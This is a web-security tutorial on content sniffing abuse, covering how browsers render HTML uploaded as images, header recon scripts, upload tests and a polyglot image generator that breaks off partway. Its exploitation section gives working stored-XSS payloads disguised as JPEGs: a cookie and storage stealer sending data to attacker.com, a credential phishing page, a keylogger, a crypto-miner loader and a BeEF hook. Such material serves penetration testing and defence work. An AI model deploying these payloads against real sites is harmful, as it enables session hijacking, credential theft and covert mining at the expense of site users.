---
title: Content Sniffing Abuse
description: Content Sniffing Abuse — Exploit MIME Type Detection Gaps for Stored XSS, Filter Bypass & Code Execution
navigation:
  icon: i-lucide-scan-search
  title: Content Sniffing Abuse
---

## Content Sniffing Abuse

::note
**Content sniffing** (MIME sniffing) occurs when a browser, server, CDN, or proxy **ignores the declared `Content-Type` header** and instead examines the raw bytes of a response to decide how to render it. When an attacker uploads a file declared as `image/jpeg` but containing `<script>alert(document.domain)</script>`, the browser may sniff the HTML tags in the content and render it as a web page — executing the JavaScript. This is one of the most underestimated file upload attack vectors because the file **never needs an executable extension**. A `.jpg` containing HTML can produce Stored XSS if the server fails to send the `X-Content-Type-Options: nosniff` header. Content sniffing abuse bypasses extension checks, magic byte validation, blacklists, and whitelists — because the file genuinely is named `.jpg` and genuinely has `Content-Type: image/jpeg`. The vulnerability exists in how the content is **consumed**, not how it is **validated**.
::

---

## Vulnerability Anatomy

The root cause of content sniffing abuse is a **three-party disagreement** between the application that validates the upload, the server that serves it, and the browser that renders it.

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="The Trust Chain Failure"}
  ```text
  UPLOAD PHASE:
    Attacker creates file: <script>alert(1)</script>
    Names it: profile.jpg
    Declares Content-Type: image/jpeg
         ↓
  VALIDATION PHASE:
    Server checks extension → .jpg → PASS ✓
    Server checks Content-Type header → image/jpeg → PASS ✓
    Server checks magic bytes → depends on implementation
    Server stores file as profile.jpg
         ↓
  SERVING PHASE:
    Browser requests: GET /uploads/profile.jpg
    Server responds with:
      Content-Type: image/jpeg
      [NO X-Content-Type-Options header]
      Body: <script>alert(1)</script>
         ↓
  RENDERING PHASE:
    Browser receives response
    Sees Content-Type: image/jpeg
    BUT inspects the content bytes...
    Detects "<script>" pattern
    OVERRIDES declared type → renders as HTML
    JavaScript EXECUTES
         ↓
  IMPACT:
    Stored XSS on trusted domain
    Cookie theft, session hijacking, keylogging
    Phishing from trusted origin
  ```

  The critical question is: **does the server send `X-Content-Type-Options: nosniff`?**

  - **With `nosniff`:** Modern browsers strictly follow the declared `Content-Type` and will NOT sniff content. The `.jpg` file is treated as a broken image.
  - **Without `nosniff`:** Browsers may inspect the content and decide it looks like HTML. The file renders as a web page with full JavaScript execution.

  This single missing header is the difference between a secure application and one vulnerable to Stored XSS through every upload endpoint.
  :::

  :::accordion-item{icon="i-lucide-layers" label="Who Sniffs — Browser Behavior Matrix"}
  Not all browsers sniff the same way. Understanding which browsers sniff in which scenarios is essential for crafting reliable exploits and accurate vulnerability reports.

  | Browser | Sniffing Aggressiveness | Scenarios Where It Sniffs | `nosniff` Support |
  | ------- | ---------------------- | ------------------------ | ----------------- |
  | **Internet Explorer 6-8** | Extremely aggressive | Overrides almost any Content-Type if content looks like HTML | Not supported |
  | **Internet Explorer 9-11** | Very aggressive | Sniffs `text/plain`, `application/octet-stream`, image types, and even `application/json` in some modes | Supported but inconsistent |
  | **Edge Legacy** | Moderate | Sniffs when Content-Type is generic or missing | Supports `nosniff` |
  | **Chrome (current)** | Conservative | Primarily sniffs `text/plain` → HTML, and responses with missing Content-Type | Strictly respects `nosniff` |
  | **Firefox (current)** | Conservative | Similar to Chrome — `text/plain` and missing Content-Type | Strictly respects `nosniff` |
  | **Safari (macOS/iOS)** | Moderate | More aggressive than Chrome/Firefox; may sniff image types to HTML in certain contexts | Partially respects `nosniff` |
  | **Samsung Internet** | Chrome-like | Follows Chromium behavior | Respects `nosniff` |
  | **Opera** | Chrome-like | Chromium-based | Respects `nosniff` |
  | **Android WebView** | Variable | Depends on app configuration; older WebViews sniff aggressively | Inconsistent |
  | **Electron apps** | Chrome-like | But app may not set security headers on local content | Depends on app config |
  | **Email clients (Outlook)** | Aggressive | Renders HTML from attachments regardless of declared type | Does not honor `nosniff` |
  | **Mobile in-app browsers** | Variable | Instagram, Facebook, Twitter WebViews may sniff differently | Inconsistent |

  ::tip
  For bug bounty, always test in **IE11** (if the target has enterprise users) and **Safari** (if the target has macOS/iOS users) — these are the most likely to sniff content aggressively enough to trigger XSS from image uploads.
  ::
  :::

  :::accordion-item{icon="i-lucide-book-open" label="MIME Sniffing Algorithm — What Browsers Actually Check"}
  The [WHATWG MIME Sniffing Standard](https://mimesniff.spec.whatwg.org/) defines the official algorithm, but real browser behavior varies. Here is what browsers actually look for:

  **HTML detection patterns (first bytes of content):**
  - `<!DOCTYPE` (case-insensitive)
  - `<html` (case-insensitive)
  - `<head` (case-insensitive)
  - `<body` (case-insensitive)
  - `<script` (case-insensitive)
  - `<iframe` (case-insensitive)
  - `<h1` (case-insensitive)
  - `<div` (case-insensitive)
  - `<table` (case-insensitive)
  - `<a` followed by space or `>` (case-insensitive)
  - `<!--` (HTML comment)

  **XML detection:**
  - `<?xml` (case-insensitive)

  **PDF detection:**
  - `%PDF-`

  **Image detection (these PREVENT sniffing to HTML):**
  - `\xFF\xD8\xFF` (JPEG) — browser treats as image, won't sniff to HTML
  - `\x89PNG` (PNG) — same
  - `GIF87a` or `GIF89a` (GIF) — same
  - `BM` (BMP) — same

  **Key insight for exploitation:** If the file starts with valid image magic bytes, browsers will NOT sniff it as HTML (even without `nosniff`). But if the file starts with HTML tags OR if the file starts with bytes that don't match any known image format, browsers may sniff it as HTML.

  This means pure HTML content uploaded as `.jpg` triggers sniffing, but a JPEG-headed polyglot may not — unless the HTML content appears prominently enough for the sniffing algorithm to detect it.
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Surface — Where Content Sniffing Matters"}
  Content sniffing doesn't just affect browsers. Multiple components in the request chain can sniff content and make security-relevant decisions:

  - **Browsers** — Primary sniffing context; renders HTML from "images"
  - **CDNs** — CloudFront, Cloudflare, Akamai may auto-detect Content-Type and override origin
  - **Reverse proxies** — Nginx, Varnish, HAProxy may add or modify Content-Type
  - **WAFs** — CloudFlare WAF, AWS WAF, ModSecurity may trust Content-Type and miss HTML in "image" content
  - **Email systems** — Exchange, Gmail, Outlook Web render attachments based on content
  - **Mobile apps** — WebView components may sniff aggressively when loading user content
  - **PDF viewers** — Embedded JavaScript in PDF executed when opened
  - **Image processors** — ImageMagick, GD, librsvg may process SVG XML entities (SSRF/XXE)
  - **Cache layers** — Redis, Memcached, CDN caches may store and replay the wrong Content-Type
  - **API gateways** — Kong, API Gateway may transform responses and lose headers
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Impact Categories"}
  | Attack | Mechanism | Impact | Severity |
  | ------ | --------- | ------ | -------- |
  | **Stored XSS from image upload** | HTML in `.jpg`, browser sniffs as HTML | Cookie theft, account takeover | High-Critical |
  | **Stored XSS from document upload** | HTML in `.pdf`/`.csv`/`.txt`, rendered as HTML | Same-origin script execution | High |
  | **SVG JavaScript execution** | SVG with `<script>` served from same origin | Stored XSS, CSP bypass | High |
  | **Phishing from trusted domain** | HTML login form in uploaded "image" | Credential theft | High |
  | **CSP bypass** | Uploaded script from same origin satisfies `script-src 'self'` | Complete CSP defeat | High |
  | **CDN cache poisoning** | HTML cached as image, served to all users | Mass XSS | Critical |
  | **SSRF via SVG** | SVG with external entity processed server-side | Internal network access | High |
  | **XXE via SVG/XML** | Entity expansion in uploaded XML | File read, SSRF | High |
  | **Keylogging** | JavaScript keylogger in uploaded "image" | Credential theft | Critical |
  | **Worm propagation** | Self-replicating XSS through upload + sniffing | Mass compromise | Critical |
  | **Drive-by download** | Malicious binary download triggered via sniffed HTML | Malware distribution | High |
  :::
::

---

## Reconnaissance — Detecting Sniffing Vulnerabilities

The first step is determining whether the target is vulnerable to content sniffing. This requires checking three things: whether `nosniff` is set, how the server determines Content-Type for uploads, and whether uploaded content is served from a same-origin or cross-origin domain.

### Security Header Analysis

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Comprehensive Header Check"}
  ```bash
  #!/bin/bash
  # content_sniff_recon.sh — Full content sniffing vulnerability assessment
  
  TARGET="${1:?Usage: $0 <target_url>}"
  
  echo "═══════════════════════════════════════════════"
  echo " Content Sniffing Vulnerability Assessment"
  echo "═══════════════════════════════════════════════"
  echo "[*] Target: $TARGET"
  echo ""
  
  # ── Check main domain headers ──
  echo "─── Main Domain Security Headers ───"
  MAIN_HEADERS=$(curl -sI "$TARGET" 2>/dev/null)
  
  NOSNIFF=$(echo "$MAIN_HEADERS" | grep -i "x-content-type-options" | tr -d '\r')
  CT=$(echo "$MAIN_HEADERS" | grep -i "^content-type:" | tr -d '\r')
  CSP=$(echo "$MAIN_HEADERS" | grep -i "content-security-policy" | tr -d '\r')
  XFO=$(echo "$MAIN_HEADERS" | grep -i "x-frame-options" | tr -d '\r')
  SERVER=$(echo "$MAIN_HEADERS" | grep -i "^server:" | tr -d '\r')
  
  echo "  Server:                  ${SERVER:-NOT SET}"
  echo "  Content-Type:            ${CT:-NOT SET}"
  echo "  X-Content-Type-Options:  ${NOSNIFF:-❌ NOT SET — SNIFFING POSSIBLE}"
  echo "  Content-Security-Policy: ${CSP:-❌ NOT SET}"
  echo "  X-Frame-Options:         ${XFO:-NOT SET}"
  
  # Analyze CSP for XSS implications
  if [ -n "$CSP" ]; then
      echo ""
      echo "  CSP Analysis:"
      echo "$CSP" | grep -qi "script-src.*'self'" && \
          echo "    ⚠ script-src includes 'self' — same-origin upload XSS may bypass CSP"
      echo "$CSP" | grep -qi "'unsafe-inline'" && \
          echo "    ⚠ 'unsafe-inline' present — inline scripts allowed"
      echo "$CSP" | grep -qi "'unsafe-eval'" && \
          echo "    ⚠ 'unsafe-eval' present — eval() allowed"
      echo "$CSP" | grep -qi "default-src.*'none'" && \
          echo "    ✓ Restrictive default-src 'none' — good"
  fi
  
  # ── Check upload and static content paths ──
  echo ""
  echo "─── Upload / Static Content Paths ───"
  
  UPLOAD_PATHS=(
      "/uploads/" "/images/" "/media/" "/files/" "/static/"
      "/content/" "/assets/" "/user-content/" "/attachments/"
      "/storage/" "/public/uploads/" "/data/" "/tmp/"
      "/wp-content/uploads/" "/sites/default/files/"
  )
  
  for path in "${UPLOAD_PATHS[@]}"; do
      RESP=$(curl -sI "${TARGET}${path}" 2>/dev/null)
      STATUS=$(echo "$RESP" | head -1 | awk '{print $2}')
  
      if [ "$STATUS" != "404" ] && [ -n "$STATUS" ]; then
          PATH_NOSNIFF=$(echo "$RESP" | grep -i "x-content-type-options" | tr -d '\r')
          PATH_CT=$(echo "$RESP" | grep -i "^content-type:" | head -1 | tr -d '\r')
          PATH_CD=$(echo "$RESP" | grep -i "content-disposition" | tr -d '\r')
  
          HAS_NOSNIFF="❌ MISSING"
          echo "$PATH_NOSNIFF" | grep -qi "nosniff" && HAS_NOSNIFF="✓ Present"
  
          echo "  [${STATUS}] ${path}"
          echo "       nosniff:     ${HAS_NOSNIFF}"
          echo "       CT:          ${PATH_CT:-NOT SET}"
          echo "       Disposition: ${PATH_CD:-NOT SET (inline by default)}"
      fi
  done
  
  # ── Check CDN / static file domains ──
  echo ""
  echo "─── CDN / External Domains ───"
  
  # Extract domains from page source
  PAGE_SOURCE=$(curl -s "$TARGET" 2>/dev/null)
  EXTERNAL_DOMAINS=$(echo "$PAGE_SOURCE" | grep -oP 'https?://[^/"]+' | \
      grep -viE "$(echo "$TARGET" | grep -oP '//[^/]+')" | sort -u | head -20)
  
  for domain in $EXTERNAL_DOMAINS; do
      CDN_HEADERS=$(curl -sI "$domain/" 2>/dev/null)
      CDN_NOSNIFF=$(echo "$CDN_HEADERS" | grep -i "x-content-type-options" | tr -d '\r')
      CDN_SERVER=$(echo "$CDN_HEADERS" | grep -i "^server:" | tr -d '\r')
  
      if [ -n "$CDN_SERVER" ]; then
          HAS_NOSNIFF="❌ MISSING"
          echo "$CDN_NOSNIFF" | grep -qi "nosniff" && HAS_NOSNIFF="✓ Present"
          echo "  ${domain}"
          echo "       Server:  ${CDN_SERVER}"
          echo "       nosniff: ${HAS_NOSNIFF}"
      fi
  done
  
  # ── Summary ──
  echo ""
  echo "═══ Assessment Summary ═══"
  
  MAIN_VULN="NO"
  [ -z "$NOSNIFF" ] || ! echo "$NOSNIFF" | grep -qi "nosniff" && MAIN_VULN="YES"
  
  if [ "$MAIN_VULN" = "YES" ]; then
      echo "  [!!!] VULNERABLE — X-Content-Type-Options: nosniff is MISSING"
      echo "        Browsers may sniff uploaded content and render as HTML"
      echo "        → Test by uploading HTML as .jpg and opening in browser"
  else
      echo "  [*] Main domain has nosniff header"
      echo "  [*] Check individual upload paths and CDN domains above"
      echo "  [*] Test in IE11/Safari which may partially ignore nosniff"
  fi
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Per-File Header Analysis"}
  ```bash
  # After uploading a file, check how that SPECIFIC file is served
  # Different files in the same directory may get different headers
  
  TARGET="https://target.com"
  UPLOADED_FILE_URL="${TARGET}/uploads/test_image.jpg"
  
  echo "═══ Uploaded File Response Analysis ═══"
  echo "[*] Checking: $UPLOADED_FILE_URL"
  echo ""
  
  # Full headers
  HEADERS=$(curl -sI "$UPLOADED_FILE_URL" 2>/dev/null)
  echo "$HEADERS"
  
  echo ""
  echo "─── Security Analysis ───"
  
  # Critical headers
  CT=$(echo "$HEADERS" | grep -i "^content-type:" | head -1 | tr -d '\r')
  NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | head -1 | tr -d '\r')
  CD=$(echo "$HEADERS" | grep -i "content-disposition" | head -1 | tr -d '\r')
  CSP=$(echo "$HEADERS" | grep -i "content-security-policy" | head -1 | tr -d '\r')
  CORS=$(echo "$HEADERS" | grep -i "access-control-allow-origin" | head -1 | tr -d '\r')
  CACHE=$(echo "$HEADERS" | grep -iE "^(cache-control|x-cache|cf-cache|age):" | tr -d '\r')
  
  VULN_SCORE=0
  
  # nosniff check
  if [ -z "$NOSNIFF" ] || ! echo "$NOSNIFF" | grep -qi "nosniff"; then
      echo "  [!!!] X-Content-Type-Options: nosniff → MISSING"
      echo "        → Browser may sniff content and render HTML"
      VULN_SCORE=$((VULN_SCORE + 4))
  else
      echo "  [OK]  nosniff present"
  fi
  
  # Content-Type check
  if [ -z "$CT" ]; then
      echo "  [!!!] Content-Type → NOT SET"
      echo "        → Browser will ALWAYS sniff when Content-Type is missing"
      VULN_SCORE=$((VULN_SCORE + 5))
  elif echo "$CT" | grep -qi "text/html"; then
      echo "  [!!!] Content-Type → text/html"
      echo "        → File renders as HTML regardless of nosniff"
      VULN_SCORE=$((VULN_SCORE + 5))
  elif echo "$CT" | grep -qi "text/plain"; then
      echo "  [!!]  Content-Type → text/plain"
      echo "        → IE will sniff text/plain as HTML"
      VULN_SCORE=$((VULN_SCORE + 2))
  elif echo "$CT" | grep -qi "application/octet-stream"; then
      echo "  [!!]  Content-Type → application/octet-stream"
      echo "        → Browsers may sniff this as HTML"
      VULN_SCORE=$((VULN_SCORE + 3))
  else
      echo "  [OK]  Content-Type: $CT"
  fi
  
  # Content-Disposition check
  if [ -z "$CD" ] || echo "$CD" | grep -qi "inline"; then
      echo "  [!]   Content-Disposition → inline or NOT SET"
      echo "        → Browser will try to render instead of download"
      VULN_SCORE=$((VULN_SCORE + 1))
  elif echo "$CD" | grep -qi "attachment"; then
      echo "  [OK]  Content-Disposition: attachment (forces download)"
  fi
  
  # CSP check
  if [ -z "$CSP" ]; then
      echo "  [!]   Content-Security-Policy → NOT SET"
      VULN_SCORE=$((VULN_SCORE + 1))
  fi
  
  # CORS check
  if echo "$CORS" | grep -qi "\*"; then
      echo "  [!]   CORS: Access-Control-Allow-Origin: * — cross-origin access allowed"
  fi
  
  echo ""
  echo "─── Risk Rating ───"
  if [ $VULN_SCORE -ge 5 ]; then
      echo "  ████████████ CRITICAL — Content sniffing XSS highly likely"
  elif [ $VULN_SCORE -ge 3 ]; then
      echo "  ████████░░░░ HIGH — Content sniffing probable in some browsers"
  elif [ $VULN_SCORE -ge 1 ]; then
      echo "  ████░░░░░░░░ MEDIUM — Limited sniffing potential (IE/Safari)"
  else
      echo "  ░░░░░░░░░░░░ LOW — Proper headers in place"
  fi
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Bulk Upload Path Scanner"}
  ```python [sniff_recon_scanner.py]
  #!/usr/bin/env python3
  """
  Scan all upload/static paths for missing X-Content-Type-Options: nosniff.
  Also checks CDN domains, subdomains, and S3/blob storage endpoints.
  """
  import requests
  import re
  import sys
  import urllib3
  urllib3.disable_warnings()
  
  class SniffReconScanner:
      UPLOAD_PATHS = [
          '/', '/uploads/', '/images/', '/media/', '/files/', '/static/',
          '/content/', '/assets/', '/user-content/', '/attachments/',
          '/storage/', '/public/', '/data/', '/tmp/', '/temp/',
          '/wp-content/uploads/', '/sites/default/files/',
          '/application/uploads/', '/public/uploads/',
      ]
  
      def __init__(self, target):
          self.target = target.rstrip('/')
          self.session = requests.Session()
          self.session.verify = False
          self.session.timeout = 10
          self.vulnerabilities = []
  
      def check_url(self, url):
          """Check a URL for sniffing vulnerability"""
          try:
              r = self.session.head(url, allow_redirects=True, timeout=5)
              nosniff = r.headers.get('X-Content-Type-Options', '')
              ct = r.headers.get('Content-Type', '')
              cd = r.headers.get('Content-Disposition', '')
              csp = r.headers.get('Content-Security-Policy', '')
  
              vuln = {
                  'url': url,
                  'status': r.status_code,
                  'nosniff': 'nosniff' in nosniff.lower(),
                  'content_type': ct,
                  'disposition': cd,
                  'csp': bool(csp),
                  'risk': 'LOW',
              }
  
              if not vuln['nosniff']:
                  vuln['risk'] = 'HIGH'
                  if not ct or 'text/plain' in ct.lower() or 'octet-stream' in ct.lower():
                      vuln['risk'] = 'CRITICAL'
  
              return vuln
          except:
              return None
  
      def scan(self):
          """Scan all paths"""
          print(f"[*] Scanning: {self.target}")
          print("-" * 60)
  
          for path in self.UPLOAD_PATHS:
              url = f"{self.target}{path}"
              result = self.check_url(url)
  
              if result and result['status'] not in [404, 0]:
                  nosniff_status = "✓" if result['nosniff'] else "❌"
                  risk_colors = {'LOW': '[-]', 'HIGH': '[!]', 'CRITICAL': '[!!!]'}
                  indicator = risk_colors.get(result['risk'], '[-]')
  
                  print(f"  {indicator} [{result['status']}] {path}")
                  print(f"       nosniff: {nosniff_status}  CT: {result['content_type'][:40]}")
  
                  if result['risk'] != 'LOW':
                      self.vulnerabilities.append(result)
  
          # Extract external domains from page and check them
          print(f"\n[*] Checking external domains...")
          try:
              r = self.session.get(self.target, timeout=10)
              domains = set(re.findall(r'https?://([^/"\s]+)', r.text))
              base_domain = re.search(r'//([^/]+)', self.target).group(1)
  
              for domain in domains:
                  if domain != base_domain and 'cdn' in domain.lower() or \
                     'static' in domain.lower() or 'upload' in domain.lower() or \
                     's3' in domain.lower() or 'blob' in domain.lower() or \
                     'storage' in domain.lower():
                      result = self.check_url(f"https://{domain}/")
                      if result:
                          nosniff_status = "✓" if result['nosniff'] else "❌"
                          print(f"  [{result['status']}] {domain} — nosniff: {nosniff_status}")
                          if not result['nosniff']:
                              self.vulnerabilities.append(result)
          except:
              pass
  
          print(f"\n{'='*60}")
          print(f"[*] Vulnerable paths: {len(self.vulnerabilities)}")
          for v in self.vulnerabilities:
              print(f"    {v['risk']:8s} → {v['url']}")
  
  if __name__ == "__main__":
      target = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"
      scanner = SniffReconScanner(target)
      scanner.scan()
  ```
  :::
::

### Upload & Sniff Behavior Testing

After identifying missing `nosniff` headers, the next step is uploading test payloads and confirming the browser actually sniffs them as HTML.

::code-group
```bash [Upload HTML as Image]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
FIELD="file"
MARKER="SNIFF_$(date +%s)"

# Create HTML payload disguised as JPEG
cat > /tmp/sniff_test.jpg << HTMLEOF
<html>
<head><title>Content Sniffing Test ${MARKER}</title></head>
<body>
<h1>Content Sniffing Vulnerability Confirmed</h1>
<p>This file was uploaded as .jpg with Content-Type: image/jpeg</p>
<p>If you see this as rendered HTML, the server is vulnerable.</p>
<script>
document.title = 'SNIFFED_${MARKER}';
console.log('Content sniffing XSS on: ' + document.domain);
</script>
<p>Domain: <script>document.write(document.domain)</script></p>
<p>Cookies: <script>document.write(document.cookie||'HttpOnly or empty')</script></p>
</body>
</html>
HTMLEOF

# Upload with image Content-Type
RESP=$(curl -s -X POST "$UPLOAD_URL" \
  -F "${FIELD}=@/tmp/sniff_test.jpg;filename=profile_${MARKER}.jpg;type=image/jpeg" \
  -H "Cookie: $COOKIE")

echo "[*] Upload response: $RESP"

# Extract uploaded file URL
FILE_URL=$(echo "$RESP" | grep -oP '"(url|path|file|location)"\s*:\s*"([^"]*)"' | \
           grep -oP '"[^"]*"$' | tr -d '"' | head -1)

if [ -n "$FILE_URL" ]; then
    echo "[*] File URL: $FILE_URL"

    # Check served headers
    SERVED=$(curl -sI "$FILE_URL" 2>/dev/null)
    echo ""
    echo "─── Served Headers ───"
    echo "$SERVED" | grep -iE "content-type|x-content-type|content-disposition"

    echo ""
    echo "[*] NEXT STEP: Open this URL in a browser"
    echo "    $FILE_URL"
    echo ""
    echo "[*] If the page renders HTML and shows domain → VULNERABLE"
    echo "[*] If the page shows raw text or broken image → SAFE (for this browser)"
fi

rm -f /tmp/sniff_test.jpg
```

```bash [Upload Various Content Types]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
FIELD="file"
XSS='<script>alert("sniff_"+document.domain)</script>'

echo "═══ Content-Type Sniffing Matrix Test ═══"
echo ""

# Test uploading HTML content with different extensions and Content-Types
for ext in jpg jpeg png gif bmp ico txt csv pdf xml json bin dat; do
    echo "$XSS" > "/tmp/sniff_${ext}.${ext}"

    for ct in "image/jpeg" "image/png" "text/plain" "application/octet-stream" \
              "application/pdf" "text/csv" "application/json"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
          -F "${FIELD}=@/tmp/sniff_${ext}.${ext};filename=test_sniff.${ext};type=${ct}" \
          -H "Cookie: $COOKIE" 2>/dev/null)

        [ "$STATUS" = "200" ] && echo "[+] .${ext} + CT:${ct} → ACCEPTED"
    done
done

rm -f /tmp/sniff_*
```

```bash [Check Served Content-Type per Extension]
TARGET="https://target.com"

echo "═══ Served Content-Type by Extension ═══"
echo ""
echo "[*] Upload files and check how server determines Content-Type"

# Upload small test files with different extensions
UPLOAD_URL="${TARGET}/api/upload"
COOKIE="session=TOKEN"

for ext in jpg png gif txt html svg xml json pdf csv; do
    echo "test content for ${ext}" > "/tmp/ct_check.${ext}"

    curl -s -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/ct_check.${ext};filename=ct_check.${ext}" \
      -H "Cookie: $COOKIE" > /dev/null

    # Check how it's served
    for dir in uploads files media images; do
        SERVED_CT=$(curl -sI "${TARGET}/${dir}/ct_check.${ext}" 2>/dev/null | \
                    grep -i "^content-type:" | head -1 | tr -d '\r')
        if [ -n "$SERVED_CT" ]; then
            echo "  .${ext} → ${SERVED_CT}"
            break
        fi
    done
done

rm -f /tmp/ct_check.*

echo ""
echo "[*] Files served as text/html → direct XSS (no sniffing needed)"
echo "[*] Files served as text/plain without nosniff → IE sniffs as HTML"
echo "[*] Files served as application/octet-stream without nosniff → browsers may sniff"
echo "[*] Files served as image/* without nosniff → limited sniffing, but check Safari/IE"
```
::

---

## Exploitation Techniques

### Technique 1 — Pure HTML Injection via Image Upload

This is the simplest and most common content sniffing attack. Upload HTML/JavaScript as an image file. If `nosniff` is missing, the browser renders it as HTML.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Stored XSS Payloads"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # ── Payload 1: Cookie stealer ──
  cat > /tmp/steal.jpg << 'EOF'
  <html><body style="display:none">
  <script>
  // Exfiltrate cookies, localStorage, and session data
  var data = {
      cookie: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage),
      url: location.href,
      domain: document.domain,
      referrer: document.referrer,
      userAgent: navigator.userAgent
  };

  // Method 1: fetch (modern browsers)
  fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: {'Content-Type': 'application/json'},
      mode: 'no-cors'
  });

  // Method 2: Image beacon (bypasses CSP in some cases)
  new Image().src = 'https://attacker.com/log?d=' + btoa(JSON.stringify(data));

  // Method 3: DNS exfil (bypasses most egress filters)
  var encoded = btoa(document.cookie).replace(/[+/=]/g,'');
  new Image().src = 'https://' + encoded.substring(0,60) + '.attacker.com/x.gif';
  </script>
  </body></html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/steal.jpg;filename=profile_photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Payload 2: Phishing page ──
  cat > /tmp/phish.jpg << 'PHISHEOF'
  <!DOCTYPE html>
  <html>
  <head>
  <title>Session Expired — Re-authenticate</title>
  <style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
       display:flex;justify-content:center;align-items:center;min-height:100vh;
       background:linear-gradient(135deg,#667eea 0%,#764ba2 100%)}
  .card{background:white;padding:40px;border-radius:12px;
        box-shadow:0 20px 60px rgba(0,0,0,.3);width:380px}
  h2{color:#333;margin-bottom:8px}
  p{color:#666;margin-bottom:24px;font-size:14px}
  input{width:100%;padding:12px 16px;margin-bottom:16px;border:1px solid #ddd;
        border-radius:8px;font-size:14px;outline:none}
  input:focus{border-color:#667eea}
  button{width:100%;padding:14px;background:#667eea;color:white;border:none;
         border-radius:8px;font-size:16px;cursor:pointer;font-weight:600}
  button:hover{background:#5a6fd1}
  .logo{text-align:center;margin-bottom:24px;font-size:28px}
  </style>
  </head>
  <body>
  <div class="card">
  <div class="logo">🔒</div>
  <h2>Session Expired</h2>
  <p>Your session has timed out for security. Please sign in again.</p>
  <form action="https://attacker.com/phish" method="POST">
  <input type="email" name="email" placeholder="Email address" required autofocus>
  <input type="password" name="password" placeholder="Password" required>
  <input type="hidden" name="origin" value="">
  <script>document.querySelector('[name=origin]').value=location.origin</script>
  <button type="submit">Sign In</button>
  </form>
  <p style="text-align:center;margin-top:16px;font-size:12px;color:#999">
  Secured by SSL • Privacy Policy
  </p>
  </div>
  </body>
  </html>
  PHISHEOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/phish.jpg;filename=banner.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Payload 3: Keylogger ──
  cat > /tmp/keylog.jpg << 'EOF'
  <html><body>
  <script>
  // Invisible keylogger — captures everything typed on the page
  var buffer = '';
  document.addEventListener('keypress', function(e) {
      buffer += e.key;
      if (buffer.length >= 10 || e.key === 'Enter') {
          navigator.sendBeacon('https://attacker.com/keys', 
              JSON.stringify({keys: buffer, url: location.href, time: Date.now()}));
          buffer = '';
      }
  });

  // Also capture form submissions
  document.addEventListener('submit', function(e) {
      var formData = new FormData(e.target);
      var data = {};
      formData.forEach(function(v,k) { data[k] = v; });
      navigator.sendBeacon('https://attacker.com/form',
          JSON.stringify({form: data, action: e.target.action, url: location.href}));
  }, true);
  </script>
  <!-- Transparent overlay to capture all clicks/keys -->
  <iframe src="/" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;opacity:0.01;z-index:99999"></iframe>
  </body></html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/keylog.jpg;filename=gallery_001.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Payload 4: Cryptocurrency miner ──
  cat > /tmp/miner.jpg << 'EOF'
  <html><body>
  <script src="https://attacker.com/coinhive.min.js"></script>
  <script>
  var miner = new CoinHive.Anonymous('SITE_KEY');
  miner.start();
  </script>
  </body></html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/miner.jpg;filename=background.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── Payload 5: BeEF hook ──
  cat > /tmp/beef.jpg << 'EOF'
  <html><body>
  <script src="https://attacker.com:3000/hook.js"></script>
  </body></html>
  EOF

  curl -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/beef.jpg;filename=avatar.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  rm -f /tmp/steal.jpg /tmp/phish.jpg /tmp/keylog.jpg /tmp/miner.jpg /tmp/beef.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Polyglot HTML+Image Files"}
  ```python [polyglot_sniff_generator.py]
  #!/usr/bin/env python3
  """
  Generate polyglot files that are valid images AND contain HTML.
  
  Strategy varies by format:
  - GIF: HTML goes in comment extension AND after trailer
  - JPEG: HTML goes in COM segment AND after EOI marker
  - BMP: HTML goes after the header (BMP has simple structure)
  - PNG: HTML goes in tEXt chunk AND after IEND
  
  Key insight: Some browsers sniff the content AFTER the image data.
  If HTML appears anywhere in the response body, the sniffing algorithm
  may detect it and override the Content-Type.
  """
  import struct
  from PIL import Image
  import io
  
  def gif_html_polyglot(output_path, html_payload):
      """GIF89a + HTML comment + HTML after trailer"""
      html_bytes = html_payload.encode()
  
      gif = bytearray()
      gif += b'GIF89a'
      gif += b'\x01\x00\x01\x00\x80\x00\x00'
      gif += b'\xff\xff\xff\x00\x00\x00'
      # Comment extension containing HTML
      gif += b'\x21\xfe'
      for i in range(0, len(html_bytes), 255):
          block = html_bytes[i:i+255]
          gif += bytes([len(block)]) + block
      gif += b'\x00'
      # Image data
      gif += b'\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00'
      gif += b'\x3b'
      # HTML AFTER GIF trailer — browsers may find it during sniffing
      gif += b'\n' + html_bytes
  
      with open(output_path, 'wb') as f:
          f.write(bytes(gif))
      print(f"[+] {output_path} — GIF+HTML ({len(gif)} bytes)")
  
